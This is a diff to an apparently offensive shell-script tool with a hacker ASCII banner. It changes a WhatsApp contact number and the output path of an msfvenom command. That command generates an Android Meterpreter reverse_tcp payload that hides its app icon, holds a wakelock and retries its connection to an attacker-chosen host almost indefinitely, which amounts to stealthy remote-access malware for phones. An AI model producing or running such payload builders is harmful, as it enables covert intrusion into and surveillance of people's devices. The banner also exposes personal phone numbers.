@@ -17,7 +17,7 @@ echo -e $red '  > <______|  __  |/ _` |/ __| |/ / __/ _` \ \ /\ / / \'
 echo -e $red ' / . \     | |  | | (_| | (__|   <| | | (_| |\ V  V /| |'
 echo -e $red '/_/ \_\    |_|  |_|\__,_|\___|_|\_\_|  \__,_| \_/\_/ |_|'
 echo " "
-echo -e $green "         WhatsApp>     +967730322236"
+echo -e $green "         WhatsApp>     +1 3528884445"
 
 echo ##
 echo -e $green '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
@@ -85,7 +85,7 @@ read -p "insert LHOST :> " lhost0
 echo " "
 echo -e $red " Please Iinsert LPORT :>"
 read -p "insert LPORT :> " lport0
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost0 LPORT=$lport0 AndroidWakelock="true" StagerRetryCount="999999" StagerRetryWait="1" AndroidHideAppIcon="true" -o /sdcard/app/.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost0 LPORT=$lport0 AndroidWakelock="true" StagerRetryCount="999999" StagerRetryWait="1" AndroidHideAppIcon="true" -o /sdcard/pyload/.apk
 echo -e $green"Payload Bas Been Created ✔"
 sleep 1
 bash X-Hackrawi.sh
